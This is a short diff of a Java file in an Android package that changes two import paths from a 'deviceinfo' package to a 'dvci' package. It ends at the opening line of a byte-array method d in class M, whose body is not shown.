@@ -1,7 +1,7 @@
 
 package com.android.mm;
-import com.android.deviceinfo.Status;
-import com.android.deviceinfo.auto.Cfg;
+import com.android.dvci.Status;
+import com.android.dvci.auto.Cfg;
 
 public class M { 
 	public static String d(byte[] ebytes, byte[] obytes){
